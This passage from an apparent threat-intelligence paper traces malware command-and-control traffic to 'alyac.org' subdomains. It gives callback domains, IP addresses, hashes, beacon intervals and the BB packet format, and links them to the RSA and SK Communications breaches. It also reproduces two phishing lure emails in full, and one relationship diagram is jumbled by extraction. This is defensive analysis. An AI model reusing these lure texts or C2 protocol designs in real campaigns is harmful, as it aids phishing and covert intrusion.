 The Murcy malware is commonly named ‘cydll.dll’, creates a mutual exclusion (mutex <fn>35</fn> ) handle named ‘Cy1.0Mutex’, and installs a service named ‘CyService’ with a display name of ‘CyService Service’.It also commonly gains persistence by creating the registry key ‘ServiceDll = %System%\cydll.com’ in the ‘ControlSet001’ key in the Local Machine hive of the Windows registry.Symantec Corporation discovered Backdoor.Murcy on 31 July 2011, yet the same malware appears to have been first detected by Kaspersky Lab on 11 January 2010 <fn>36</fn> .Malware samples with the same attributes date back to at least October 2009 <fn>37</fn> .This suggests that the Murcy malware has been in use for at least two years.Known Murcy malware uses the callback domains ‘albertstein.ddns.us’ <fn>38</fn> , ‘alvington.jetos.com’<fn>39</fn>, ‘ftp.xmahone.ocry.com’<fn>40</fn>, and ‘superaround.ns02.biz’ <fn>41</fn> .These callback domains were all also reportedly used in the March 2011 intrusion into RSA’s network.That intrusion resulted in the theft of information related to RSA’s SecurID two­factor authentication products.The stolen information was later used to enable targeting of defence contractors.(Coviello, 2011).(Rasmussen, 2011) (US­CERT, 2011).</section>

<section>
<heading>THE ‘OSCAR’ PROTOCOL</heading>
Numerous computers were observed communicating with an ‘alyac.org’ subdomain on TCP port 80 via the ‘Oscar’ protocol.Most, but not all, of the computers also communicated to the same domain via the ‘Update?’ communications.The protocol is believed to be associated with the same malware that produces the ‘Update?’ communications – the Destory RAT.Each compromised computer communicated at a different interval to the others, and accordingly, the malware on each of the compromised computers appears to have been individually configured.For example, one computer communicated every 12 seconds and another every 16 seconds.Encrypted data was sent during each communication.The length of the encrypted data in each packet varied between 16 bytes and 89 bytes.After sending the encrypted data the malware waited for a response.</section>

<section>
<heading>THE ‘BB’ PROTOCOL</heading>
Two computers were observed communicating with ‘update.alyac.org’ via the ‘BB’ protocol.One of the computers used a Chinese IP address, the other a South Korean IP address.The ‘BB’ protocol has a 21 byte header containing a 4 byte XOR key that can be used to decode the remaining bytes in the packet.The packet format is described in Table 5.<table>
 BYTE SIZE 
DESCRIPTION*
 POSITION (BYTES)
 0 4 SizeBB ­ Size in bytes (including 
 header).4 4 Possible communication type
 indicator.‘0x01 0x00 0x00 0x00’ in all
 observed communications.8 4 Victim specific bytes.12 4 XOR key.16 4 Unknown.‘0x01 0x04 0x01 0x00’ in all
 observed communications.20 1 Unknown.’0x00’ in all observed 
 communications.21 [SizeBB] Data encoded using the 4 byte XOR key
 specified in bytes 12­15.* ALL VALUES ARE LITTLE­ENDIAN UNLESS OTHERWISE STATED.<caption>TABLE 5: 'BB' PROTOCOL PACKET FORMAT</caption>
</table>


 Once decoded, the data reveals a basic beacon containing the computer name and IP address of the infected computer.<footnote> 
35 A mutex is a technical construct used to control access to system resources.In this case the technical meaning is less significant than the fact that the mutex in the Murcy malware is uniquely named.36 Malware that fits the profile of Murcy malware was detected on 11 January 2010 as ‘Backdoor.Win32.Agent.anvj’.(Kaspersky Lab ZAO, 2010) 

37 Malware detected in 2009 with the MD5 hashes ‘3FDE A18B 9610 CBC9 B63B A7A4 4899 FBFB’ and ‘42E8 163B 7F08 DD38 3E62 E4BD B7F0 7C08’ is known to callback to IP address 203.160.67.130.(Sunbelt, 2009) (Sunbelt Security, 2009) 

38 Malware with the MD5 hashes ‘19B0 227B EC75 BEF9 3C6C CC54 9B6D 2BA0’ and ‘3DF0 D0AB 4AD9 DA45 59A1 C646 4C85 26D1’ callback to the domain ‘albertstein.ddns.us’.(GFI Software, 2010) (Sandbox, 2010) 

39 Malware with the MD5 hashes ‘91A2 68B3 17D2 CC65 69B8 5BB0 3A5F F841’ and ‘69ED 8F7B 0046 9560 45A9 0E36 E3C8 3F6A’ callback to the domain ‘www.alvington.JetOS.com’.(GFI SandBox, 2011) (Sunbelt Security, 2010)

40 Malware with the MD5 hashes ‘0D38 D6C2 B9EB 817B 40AF C427 2545 A43B’, ‘3E37 36DF FEDA F2A0 AE4D 9485 6793 3B3F’ and ‘9ADD C6D5 7330 9399 E2B8 7887 3A00 A921’ callback to the domain ‘ftp.xmahone.ocry.com’.(GFI Sandbox, 2011) (Telus, 2011) (Threat Expert Ltd, 2011) (GFI Sandbox, 2011) 

41 Malware with MD5 hash ‘3740 5D5B CF64 FB95 47CA CDA9 5F4C E8B4’ is known to callback to ‘www.superaround.ns02.biz’.(GFI Sandbox, 2010) 
</footnote>

After sending the basic beacon, the compromised computers waited for a response from the server, then closed the connection when they had not received a response from the server within five seconds.Both of the compromised computers reattempted the communications approximately every eight seconds.On some days the high frequency of the beacon activity resulted in over 10000 connection attempts per victim in a 24 hour period.</section>

<section>
<heading>THE ‘DB’ PROTOCOL</heading> 
 
A single computer was observed communicating with the domain ‘update.alyac.org’ via the ‘DB’ protocol.The communications originated from the same Chinese computer network as one of the ‘BB’ victims but from a different computer on that network.It is not known what malware generates the ‘DB’ communications, or whether it is the same malware that generates the ‘BB’ communications.The communications reveal detailed OS and system information about the compromised computer as shown in Table 6.The OS information reveals that the compromised computer is running Windows 2003 Server Service Pack 2.The detailed system information reveals that the compromised computer has an Intel Pentium Pro­class processor, four logical processors and an LGA 775 <fn>42</fn> Central Processing Unit (CPU) socket.<table> 
BYTE SIZE DESCRIPTION 
POSITION<fn>43</fn> (BYTES)
 
0 156 OSVERSIONINFOEX structure (format
 shown in Annex A).156 36 SYSTEM_INFO structure (format shown in 
 Annex B).192 10 Computer name.<caption>TABLE 6: SUMMARY OF FIRST 202 BYTES OF A ‘DB’ PACKET</caption> 
</table> 


 The DB communications typically occurred at intervals of between 4 and 92 seconds, however, sometimes they were much further apart.After sending the detailed beacon to the command and control server, the compromised computer appeared to expect a response from the server.</section>

<section>
<heading>THE ‘QDIGIT’ PROTOCOL</heading>
One computer using a static South Korean IP address was observed sending the five bytes 0x51 0x31 0x39 0x21 0x00 (“\x51Q19!”) to ‘update.alyac.org’ on TCP port 80 up to nearly 800 times a day.While the communications did not occur continuously (likely due to the computer being turned off), when they did occur a new connection was attempted, and the packet containing ‘Q19!’ sent, approximately every minute.It is assumed these communications are generated by malware but it is not known what malware, or which other callback domains that malware uses.The malware appeared to expect a response from the server after it sent each packet.</section>

<section>
<heading>FREQUENCY OF COMMUNICATIONS</heading>
The communications to ‘alyac.org’ subdomains occurred frequently from each compromised computer.A summary of typical observed intervals between communications, broken down by protocol, is shown in Table 7.<table>
 PROTOCOL TYPICAL BEACON INTERVAL*
 (SECONDS)
 LURK 26
 X­Shell C601 36
 Update?1 to 13, 12±3, 16, 104±3 or 200 ±15
 Murcy 11
 Oscar 12±2, 13, 15, 16, (55 or 155±5), (7.5, 8.5 or 15) ,
 (45, 55, 106)
 BB 8
 DB 4 to 92
 Qdigit 60

* Commas indicate that the interval changed between victims.Brackets indicate that a variety of intervals were observed from
a single computer.<caption>TABLE 7: INTERVAL BETWEEN COMMUNICATIONS</caption>
</table>


 The single LURK victim was typically observed beaconing at 26 second intervals, the Murcy victim at 11 second intervals, and the Qdigit victim at 60 second intervals.All of the X­Shell C601 victims were typically observed beaconing at 36 second intervals, and the BB victims at 8 second intervals.The beaconing interval of the other victims does not appear to be a fixed time, and instead a degree of randomness appears to be employed.<footnote>
42 The combined processor level and processor revision information indicates the computer has an LGA 775 CPU socket (Intel family 6/ model 15/ stepping 11).(Microsoft Corporation, 2011) (Wikipedia)

43 On several occasions the 4 bytes ‘70 17 00 00’ were prepended to the communications.</footnote>


As shown in Table 8, the observed communications all occurred on TCP port 80 or TCP port 443 ­ ports commonly used for legitimate purposes <fn>44</fn>.<table>
PROTOCOL PORT 
LURK 80 
 
X­Shell C601 443
 
Update?80
 
Murcy 80 
Oscar 80 
BB 80 
DB 80 
 
Qdigit 80
<caption>TABLE 8: COMMUNICATION PORTS USED</caption> 
</table>

</section>

<section> 
 <heading>NAME SERVERS</heading>
 
While most malware uses the local DNS server settings of the compromised computer to resolve its callback domain to an IP address, in some observed communications the attackers appear to have specifically chosen the DNS servers.The majority of X­Shell C601 malware that called back to ‘path.alyac.org’ used Google DNS servers, presumably instead of the DNS settings on the compromised computers.The X­Shell C601 malware supports use of a specified DNS server to resolve callback domains, and it appears the attackers have made use of this functionality.The ‘Update?’, Oscar, Murcy and Qdigit victims all appear to have used their local DNS server settings to resolve the callback domains.On the other hand, the single LURK victim used Google DNS servers to resolve its callback domain, as did the Chinese BB victim (and associated DB victim) but not the South Korean BB victim.This suggests that the LURK, BB and DB malware may also have the same DNS functionality as X­Shell, although it is possible that the victims are configured to use the Google servers as their regular DNS servers, and that the malware is not using different servers.</section>

<section>
<heading>ASSOCIATION WITH MALWARE AND ATTACKS</heading>
The observed communications have links to a variety of malware and to a number of attacks, as illustrated in Figure 9, and detailed below.The ‘Update?’ communications and the Oscar communications are both associated with the Destory RAT family of malware.This malware family has been used in a number of targeted attacks including the July 2011 SK Communications hack.Through shared infrastructure the malware has links to the series of coordinated, covert and targeted cyber attacks dubbed ‘NightDragon’<fn>45</fn>, and also to the recent series of targeted attacks that have used ‘Sykipot’ <fn>46</fn> malware.Through a shared callback domain the Destory RAT malware also has links to socially engineered emails including those that targeted experts on the relationship of the United States with Japan, China and Taiwan.The Destory RAT is also connected to LURK malware via a compromised code signing certificate which was used to sign both pieces of malware, and to IP2B communications by a shared callback domain.The X­Shell RAT has been used in numerous attacks but many of these attacks are not expected to be associated with the same attackers.On the other hand, the callback domains used by Murcy malware suggest that the malware is used, perhaps solely, by the attackers responsible for the March 2011 RSA breach.IP addresses, to which ‘alyac.org’ and its subdomains previously pointed, associate the domain, and the attackers behind it, with a raft of activity.This includes activity involving callback domains registered to appear as though they were associated with legitimate, trusted entities, and  domains registered to a ‘Lee Cooper’ that tie back to the SK Communications hack.<footnote>
44 TCP ports 80 and 443 are commonly used for legitimate HTTP and HTTPS activity respectively, and as such communications to  these ports are often allowed through firewalls.45 The NightDragon series of attacks began in, or prior to, November 2009 and targeted global oil and petrochemical companies.(McAfee Foundation Professional Services and McAfee Labs, 2011)

46 Sykipot is a family of malware used since 2007 to steal intellectual property.The malware has been used in a series of socially engineered email campaigns against a variety of sectors.On a number of occasions, the attackers have exploited zero day vulnerabilities to install the malware.Some variants of the malware include features that enable it to hijack smartcards.(Thakur, 2011) (Lelli, 2010) (Blasco, 2012)
</footnote>

<figure>
 SK 
 *.duamlive.com ro.diggfunny.com ‘Lee Cooper’
 Communications
 hack
 Targeted emails Several targeted 
 Poison *.network­ attacks
 Ivy RAT sec.net Trojan.Win32.pu.flower­show.org bbs.ezxsoft.com
 Compromised code AgentBypass
 signing certificate
 (6724340ddbc7252f7fb
 LURK *.windowupdate.org
 112.121.171.94 www.adv138mail.com 714b812a5c04d)
 malware


 www.mailsignin.net newhose.ntimobile.com 202.30.224.240 The LURK 
 protocol
 Unique
 Destory
 *.mail­ sms.servegame.com directory
 RAT Oscar pc.nprotects (03a075fb70d5d6
 ru2.com 175.45.22.220 222.122.20.241
 protocol .org 75f9dc26fc)
 Update?*.join3com.com
 communications
 *.mail­kr2.com
 *.oerco.com ‘madconnon
 BB Qdigit Qdigit Trojan.Win32.Generic
 @126.com’
 malware communications malware (tcomoniter.exe)
 12.68.249.62

 67.90.204.228 *.afbjz.com NightDragon
 Alyac.org
 BB and its Several 
 *.world DB protocol DB malware
 protocol subdomains attacks
 209.133.72.83 *.bluelightness.com securitys.com


 *.todaygonever.The communications sent to ‘www2.mail­kr2.com’ are similar <fn>50</fn> , but not identical, to IP2B communications, further linking the observed activity.Other ‘mail­kr2.com’ subdomains include ‘cb85.mail­kr.com’, ‘sa****.mail­kr2.com’, and ‘skylie.mail­kr2.com’ ­ at least two of which are known to be associated with malware <fn>51</fn>.Destory RAT malware is known to use the callback domain ‘bbs.afbjz.com’ <fn>52</fn> , while known NightDragon malware uses the callback domain ‘blog.afbjz.com’<fn>53</fn>.As of 3 February 2012, both of the subdomains point to US IP address 67.90.204.228.This overlap in infrastructure appears to be of particular significance given the following links between other activity on the same IP address.As of 6 February 2012, the domains ‘gmail.mail­ ru2.com’, ‘live.mail­ru2.com’, ‘mail­ru2.com’, ‘msn.mail­ru2.com’, ‘usaisbig.oerco.com’, ‘whois.oerco.com’, ‘www.afbjz.com’, and ‘www2.oerco.com’ also point to IP address 67.90.204.228.At least one of these domains is  otherwise known to be associated with malware <fn>54</fn>.The ‘oerco.com’ domain is registered to the same person as ‘afbjz.com’<fn>55</fn>, associating the two domains with a single entity.The ‘mail­ru2.com’ domain appears to be associated with the same entity as the ‘mail­kr2.com’ domain used by NightDragon malware and the Destroy RAT (as described above).While the domains were registered using different details, they were registered on the same day through the same domain name registrar, and the records later updated minutes apart56.This suggests that all C2 activity involving IP address 67.90.204.228 may be associated with a single entity.The recently expired domain ‘todaygonever.com’ also previously pointed to the same IP address.As will be discussed later in the paper, ‘todaygonever.com’ is directly associated with  malware and has links to the recent series of Sykipot attacks.The recently expired domains ‘goodfeelingauto.com’ and ‘deadlinely.com’ also pointed to the same IP address and were likely associated with the same attackers.<heading>Socially Engineered Emails</heading>
Other Destory RAT callback domains are also otherwise linked to malicious activity.For example,  the callback domain 'www.adv138mail.com' <fn>57</fn> was used by a Poison Ivy RAT<fn>58</fn> sent in a July 2011  socially engineered email campaign.The emails contained an attachment, named ‘Meeting Agenda.pdf’, which attempted to exploit a vulnerability specified by the Common Vulnerabilities and Exposure (CVE) number 2010­ 2883<fn>59</fn> to install the Poison Ivy RAT.A clean decoy  PDF file was shown to the user when the attachment was opened.A copy of the text used in the socially  engineered email campaign is shown in Figure 10 <fn>60</fn>.</section>

<footnote>
47 The Destory RAT with MD5 hash ‘9555 8985 D211 F768 1ACC 1AC9 2DCB 07C8 A096 B403’ uses the callback location ‘vupdate.mail­kr2.com’.48 Malware with MD5 hash ‘2D8A 9038 E151 FB30 D45E A866 8AFD 2A8E’, known to call back to ‘ma2.mail­kr2.com’, is detected by antivirus software as ‘TrojanDropper:Win32.RedSip.A’, an alias for NightDragon malware.(ThreatExpert Ltd., 2010) (Hispasec Sistemas, 2011) (Kurc, 2011)

49 Malware with MD5 hash ‘5BC5 97E4 8270 F04E C9B6 8343 2432 E352’, known to call back to ‘www2.mail­kr2.com’, is detected by antivirus software as ‘Backdoor:Win32/RedSip.A!svc’, an alias for NightDragon malware.(Sunbelt Security, 2010)  (Hispasec Sistemas, 2010)

50 Both communications begin with a 16 byte header containing the protocol identifier ‘0x12345678’ and a data size, and the data in  both contains similar system information but in a different order.51 Malicious files are separately known to attempt communications with ‘sa*****.mail­kr2.com’ on TCP port 8000, and ‘cb85.mail­ kr2.com’ on TCP port 6543.(Doctor Web, 2011) (Sunbelt Security, 2011)

52 The domain ‘bbs.afbjz.com’ is a known callback domain of Destory RAT malware that is detected by antivirus software as both Backdoor:Win32/Thoper.A and Backdoor.Sogu.(Wong, 2011) (Mullaney, 2011) 

53 The domain ‘blog.afbjz.com’ is a known callback domain of NightDragon malware that is detected by antivirus software as  ‘Trojan.Dropper:Win32/Redsip.A’.(Kurc, 2011) 

54 Malware that is detected by antivirus software as ‘Trojan.DownLoader4.8565’ communicates with us****ig.oerco.com on TCP port 100.(Dr.Web, 2011) 

55 Both domains are registered to a person whose contact email address is ‘madconnon@126.com’.The name and address details are identical for both domain registrations.56 The domain ‘mail­kr2.com’ was last modified on 24 February 2012 at 1:40:32, while the domain ‘mail­ru2.com’ was last modified on the same day at 1:43:53.Both domains were registered through 35 Technology Co., Ltd on 8 March 2010.57 The domain ‘www.adv138mail.com’ is listed as a Backdoor.Sogu callback.(Mullaney, 2011)

58 The Poison Ivy RAT is an advanced remote administration tool for Windows.Both free and paid versions of the RAT are available.(shapeless n.d.)

59 CVE 2010­2883 refers to a particular vulnerability in certain versions of Adobe Reader and Acrobat which an attacker can use to take control of affected Windows, Macintosh and UNIX systems.(Adobe Systems Incorporated 2010)

60 Email courtesy of Mila Parkour of ‘contagiodump.blogspot.com’.(Parkour 2011)
</footnote>

<section>
<figure> 
 Dear <recipient>, 

 The Sasakawa Peace Foundation would like to extend to you an invitation to be our guest speaker at the America’s Strategic Restraint and its Implications for the U.S.- Japan Alliance.As you know, the Sasakawa Peace Foundation is interested in the U.S.- Japan Alliance 
 
 Since you are familiar with the field, we know your views will be extremely interesting to us.please find enclosed further details, we would appreciate having your acceptance soon so we may complete our agenda.Best wishes,
 
 <purported sender>
<caption>FIGURE 10: TEXT OF A SOCIALLY ENGINEERED EMAIL ASSOCIATED WITH WWW.ADV138MAIL.COM</caption> 
</figure>
 
 The domain ‘www.adv138mail.com’ is also associated with malware detected by antivirus software as ‘Backdoor.Win32.Delf.abow’ <fn>61</fn> .Other known subdomains include: 
- ‘asm.adv138mail.com’,
- ‘dns.adv138mail.com’,
- ‘ftp.adv138mail.com’,
- ‘ihi.adv138mail.com’<fn>62</fn>,
- ‘nov.adv138mail.com’.These domains (with the possible exception of the ‘dns’ and ‘ihi’ subdomains) have all pointed to the same infrastructure <fn>63</fn> as the domains ‘pu.flower­ show.org’ and ‘www.mailsignin.net’.That shared infrastructure is known to have been used to send socially engineered emails that contained an attachment named ‘invtation.pdf’ [sic].Similar to the ‘Meeting Agenda’ attachment, ‘invtation’ installs a Poison Ivy RAT, but one configured to communicate with the callback domain ‘pu.flower­show.org’ <fn>64</fn>.The text used in the emails is shown in Figure 11 <fn>65</fn>.<figure>
 Dear Sir/Madam,
 I’m greatly honored to invite you to the seminar about technology, which will be held on 28th,July.We would appreciate it if you would take your spare time to share the occasion with us.The detail information is in the attachment.Please confirm your participation at your earlist convenience.Looking forward to your reply.Thanks very much.Best Regards,
 <purported sender>
<caption>FIGURE 11: TEXT OF A SOCIALLY ENGINEERED EMAIL SENT FROM IP ADDRESS 112.121.171.94</caption>
</figure>

<heading>Additional Destory RAT Links</heading>

In addition to having previously shared infrastructure with the known Destory RAT callback domain ‘www.adv138mail.com’, the domain ‘www.mailsignin.net’ has also previously shared infrastructure with at least two other known Destory RAT callback domains.The domain ‘www.mailsignin.net’ previously pointed to IP address 175.45.22.220, as did the known Destory RAT callback domains ‘newhose.ntimobile.com’ and ‘sms.servegame.com’<fn>66</fn>.A number of subdomains of the Destory RAT­associated domain ‘join3com.com’ also previously pointed to the same IP address <fn>67</fn>.These links suggest that many attacks in which the Destory RAT has been used are linked, not only by the malware, but also through C2 infrastructure.This further supports the notion that the Destory RAT was developed by, or for, particular attackers and that most, if not all, of the malicious activity involving it is attributable to those attackers.The Destory callback domains also have links to additional malware.For example, the domain ‘network­sec.net’ has been used by the Destory RAT (‘gm1.network­sec.net’), by Poison Ivy malware (‘yoyo.network­sec.net’ <fn>68</fn> ) and by ‘Backdoor­FCQ’ (‘pingabm.network­sec.net’,’ ‘psbm11025.network­ sec.net’ and ‘psbm10.network­sec.net’<fn>69</fn>).<footnote> 
61 The malware with MD5 hash ‘F0B8 48A8 41D4 EF34 06A6 F9C4 766C 540B’ modifies the ‘hosts’ file on computers it is run on so that the file contains an entry for ‘www.adv138mail.com’.(ThreatExpert Ltd., 2011) 

62 The domain ‘ihi.adv138mail.com’ is listed as a Backdoor:Win32/Thoper.A callback location.(Wong, 2011) 

63 The domains previously pointed to a C2 server located at IP address 112.121.171.94.64 The socially engineered email that communicated back to ‘pu.flower­show.org’ was sent from IP address 112.121.171.94 – the same IP address to which the callback domain pointed.65 Email courtesy of Mila Parkour of ‘contagiodump.blogspot.com’.(Parkour, contagio: Jul 5 CVE­2010­2883 PDF invitation.pdf with Poison Ivy from 112.121.171.94 | pu.flower­show.org, 2011) 

66 The domains ‘newhose.ntimobile.com’ and ‘sms.servegame.com’ are listed as known callbacks for Backdoor.Sogu and Thoper.A respectively.(Wong, 2011) (Mullaney, 2011)

67 The ‘join3com.com’ subdomains ‘123.join3com.com’, ‘dow.join3com.com’, ‘ftp.join3com.com’, and ‘ico.join3com.com’ are all known to have pointed to IP address 175.45.22.220.The domain ‘catalog.join3com.com’ is listed as a known Backdoor:Win32/Thoper.A callback location.(Wong, 2011)

68 The domain ‘yoyo.network­sec.net’ is used by malware with MD5 hash ‘3703 7F67 4BCB BB7E EF38 89AB 6EB3 0268’.(Threat Expert Ltd., 2008)
</footnote>


<heading>Compromised Code Signing Certificate</heading> 
 
The observed LURK communications appear to be the same as those generated by malware that was digitally signed using a compromised code signing certificate that was used to sign a Destory RAT, and other malware used in several attacks <fn>70</fn> .That malware communicates with the domain ‘office.windowupdate.org’ – a domain that is linked to ‘alyac.org’ not only by the communications protocol but also by both domain registration tactic and infrastructure<fn>71</fn>.(Fagerland, 2011) 
 
<heading>Travlman Links</heading> 
 
The Destory RAT malware used in the SK Communications hack <fn>72</fn> is identical, except for its configuration, to malware<fn>73</fn> that communicates with the callback domain ‘wow.travlman.com’.The callback domain previously pointed to the same IP address as that used in the SK Communications hack<fn>74</fn>.Both of the malicious files were compiled from the same code on 27 September 2010 at 09:17:04 Greenwich Mean Time (GMT) <fn>75</fn>, and later configured.The callback domain ‘wow.travlman.com’ is also used by malware <fn>76</fn> that produces ‘IP2B’ communications of an identical format to those decoded from the ‘Extra­Data’ in the Murcy communications.This highlights an additional link between the Destory RAT and the IP2B communications.Several other ‘travlman.com’ sub­domains are known to exist <fn>77</fn> including at least one that is associated with malware.The sub­domain ‘dm.travlman.com’<fn>78</fn> is the callback used by malware detected by antivirus software as ‘Trojan:Win32/Boupke’<fn>79</fn>.<heading>Link to RSA Breach</heading>
The majority of the known callback domains for Murcy malware were used in the March 2011 RSA breach.This suggests that the attackers responsible for the RSA breach also use the Murcy malware.Given that the malware is reportedly not in widespread use, the Chinese server communicating with ‘path.alyac.org’ may have been compromised by the same attackers responsible for the RSA breach.X­Shell RAT

The X­Shell RAT is commercially available software that appears to have been used in a number of attacks.There are numerous versions of the X­Shell RAT, and not all produce the same communications.Malware that generates the same X­Shell C601 communications <fn>80</fn> observed to ‘path.alyac.org’ appears to have been used in a number of attacks.Malware that generates similar communications also appears to have been used in a number of attacks <fn>81</fn>.That malware is thought to be an X­Shell C603 RAT and not an X­Shell C601 RAT.It is not known whether any of these malicious files were used by the same attackers who used the X­shell malware which  communicates with ‘path.alyac.org’.<footnote>
69 Backdoor­FCQ uses several ‘network­sec.net‘ subdomains as callback locations.(McAfee Inc., 2011) 
70 The first reported abuse of the certificate was in relation to the Hupigon trojan with MD5 hash ‘8800 8398 71A3 3801 B2B4 6F9E 23B7 B7A5’.(Hispasec Sistemas, 2011) (Common Computer Security Standards) 
71 Refer to the ‘LURK Communications’ section for additional information.72 The Destory RAT used in the SK Communications hack was hosted on a toolbox as ‘nateon.exe’, and called back to ‘nateon.duamlive.com’.It has a SHA1 hash of ‘F84C D73D ABF1 8660 7F98 6DF9 8C54 02A5 7BB5 8AD1’ and MD5 of ‘4618 84F1 D41E 9E07 09B4 0AB2 CE5A FCA7’.(Command Five Pty Ltd, 2011) 
73 Malware with the MD5 hash ‘5FCE 1FC1 8283 D76C 396A 3CCC 64BD BBDE’ calls back to ‘wow.travlman.com’.74 Both ‘wow.travlman.com’ and ‘duamlive.com’ previously pointed to IP address 203.160.67.131.(rbls, shenqi.travlman.com is not listed in any blacklists, 2011) (DomainTools, LLC) 
75 Automated analysis reports confirm the compilation time of the code and that, while the MD5 hash of each of the files is different, the MD5 hashes of each of the code sections, except for the .data section, are identical.(Hispasec Sistemas, 2011) (Hispasec Sistemas, 2011) 
76 Malware with MD5 hash ‘B098 AEE1 6BD1 38C4 1207 5C9D 315A EFC9’.(Threat Expert Ltd, 2010) 
77 The following are known ‘travlman.com’ subdomains; ‘dm.travlman.com’, ‘g.travlman.com’, ‘g1.travlman.com’, ‘g2.travlman.com’, ‘luandao.travlman.com’, ‘mail.travlman.com’, ‘seo.travlman.com’, ‘shenqi.travlman.com’, ‘wayi.travlman.com’, and ‘www.travlman.com’.78 Malware with MD5 hash ‘70A8 8091 E1F9 A7BE E246 488C CE79 936A’ is known to request the webpage ‘http://dm.travlman.com/up.txt’.(Sunbelt Security, 2009)
79 Malware with MD5 hash ‘70A8 8091 E1F9 A7BE E246 488C CE79 936A’ is detected by antivirus software as ‘Trojan.Win32.Boupke!IK’, ‘Trojan:Win32/Boupke.gen!A’, and ‘Trojan.Win32.Boupke’.(Hispasec Sistemas, 2009)
80 Automated analysis reports exist on the Internet for probable X­ Shell 601 malware with MD5 hash ‘6581 3CBB 660E 91CD 5FA0 8300 E177 EB09’, ‘2299 47CC 71A4 601B 8B77 94B4 02E5 36A9’, ‘DA2F 9831 5F4C 56FC E212 73E2 1E45 3B76’, and ‘F4C0 8D3D F5ED E079 0E34 EAE0 C5DB 8A7A’.(Hispasec Sistemas, 2011) (Threat Expert Ltd, 2011) (Threat Expert Ltd, 2011) (Threat Expert Ltd, 2011)
81Automated analysis reports exist on the Internet for probable X­ Shell 603 malware with MD5 hash ‘6799 93AD 2CF8 EFDC 788E 0BA2 04D6 9B0D’, and ’CE93 8C64 7831 080B 7116 5389 E43E 744D’.(Hispasec Sistemas, 2011) (Hispasec Sistemas, 2011)
</footnote>

 
<heading>Shared Alyac Infrastructure</heading> 
 
The domain ‘alyac.org’ previously pointed to a C2 server located at IP address 222.122.20.241 and another located at IP address 202.30.224.240.These IP addresses are associated with a number of other callback domains including ‘bbs.ezxsoft.com’, ‘pc.nprotects.org’, and ‘wow.travlman.com’ ­ the latter being linked to both the Destory RAT and IP2B communications (as previously discussed) <fn>82</fn>.In addition to both having shared infrastructure with ‘alyac.org’, the two callback domains ‘bbs.ezxsoft.com’ and ‘pc.nprotects.org’ are used by malware that creates a uniquely named directory <fn>83</fn>.This indicates a direct relationship between the two pieces of malware.The domain ‘ezxsoft.com’ was registered by the same entity (‘Lee Cooper’) as a domain used in the SK Communications hack (‘ro.diggfunny.com’), further linking it to the same attackers.The C2 server and the callback domains also have links to a myriad of other malicious activity<fn>84</fn>.<heading>Sykipot Activity</heading> 
 
As previously discussed, before it expired, ‘todaygonever.com’ pointed to a C2 server associated with both the Destroy RAT and NightDragon malware.The same domain is also associated with Sykipot activity through shared C2 server infrastructure, and domain registration information.Over its lifetime the domain ‘todaygonever.com’ pointed to numerous IP addresses, many of which are not noteworthy as they were assigned to servers that hosted numerous websites.Four of the IP addresses, however, are of particular note – IP addresses 67.90.204.228 (as previously discussed), 67.79.149.90, 209.133.72.83 and an IP address allocated to a large US financial institution.IP address 67.79.149.90 previously hosted the known Sykipot domain ‘help.newcarstyle.com’.Both IP address 67.79.149.90 and IP address 209.133.72.83 previously hosted ‘bluelightness.com’ subdomains<fn>85</fn>.They therefore have additional links to Sykipot activity as ‘shopping.bluelightness.com’ was previously hosted on IP address 209.53.155.244 ­ the same IP address as the known Sykipot domains ‘www.topix21century.com’ and ‘notes.topix21century.com’ <fn>86</fn>.The ‘bluelightness.com’ domain is also linked to ‘mail­kr2.com’ ­ a Destory RAT and NightDragon domain previously discussed.Both domains share infrastructure with the domain ‘worldsecuritys.com’<fn>87</fn>.As of 6 February, the domains ‘file.filesdelete.com’, ‘news.welldone123.net’ and ‘well.welldone123.net’ all point to the IP address
allocated to the large US financial institution (to which ‘todaygonever.com’ also previously pointed.)The domain ‘welldone123.net’ is a known Sykipot callback domain<fn>88</fn>.The domain ‘filesdelete.com’ is also otherwise associated with malware <fn>89</fn>.The email address listed in the domain registration for ‘todaygonever.com’ was ‘janagreen2000@gmail.com’.The same contact email
address (but different name, address, and phone and fax numbers) was also used in the domain registration for ‘centurycpc.com’, ‘filesdelete.com’, ‘greenrightway.com’, ‘quicklyfindme.com’, and ‘newcarstyle.com’ – at least two of which are known Sykipot malware domains <fn>90</fn>.</section>

<footnote> 
82 Malware detected as 'Trojan.Win32.AgentBypass' uses the  callback domain 'bbs.ezxsoft.com'.Malware detected as ‘Trojan.Win32.Generic’ uses the callback domain ‘pc.nprotects.org’.(GFI SandBox 2011) (GFI SandBox 2011) 

83 Both pieces of malware create a directory named ‘03a075fb70d5d675f9dc26fc’ and a subdirectory named ‘update’.(GFI SandBox 2011) (GFI SandBox 2011) 

84 For further details of the links, refer to the paper ‘SK Hack by an Advanced Persistent Threat’.(Command Five Pty Ltd, 2011) 

85 IP address 67.79.149.90 previously hosted ‘helpdesk.bluelightness.com’ and IP address 209.133.72.83 previously hosted ‘shopping.bluelightness.com’.86 IP address 209.53.155.244 previously hosted ‘notes.topix21century.com’, ‘shopping.bluelightness.com’, and ‘www.topix21century.com’.The webpage ‘topix21century.com’ was used, in what is believed to have been a targeted attack, to install Sykipot malware on computers which visited the webpage.The installed malware then communicated with a C2 server located at ‘notes.topix21century.com’.(Symantec Corporation, 2010) (MalwareGroup.com)

87 In 2011 both the known callback domain ‘cb85.mail­kr2.com’ and ‘test.worldsecuritys.com’ pointed to IP address 12.68.249.62, the later still points there as of 9 February 2012.In 2011, ‘bluelightness.com’ and ‘worldsecuritys.com’ both pointed to IP address 68.178.232.100, the later still points there as of 9 February 2012.88 The domain ‘welldone123.net’ is known to be associated with the Sykipot series of attacks.(Symantec Corporation, 2012)

89 The domain ‘www.filesdelete.com’ is associated with ‘Troj/Bdoor­BDM’.(Sophos Ltd., 2012)

90 The domain ‘help.newcarstyle.com’ is a known Sykipot callback, as is ‘greenrightway.com’.(Symantec Corporation, 2012) (Malware Domains, 2012)
</footnote>

<section> 
<heading>INSIGHTS</heading> 
 
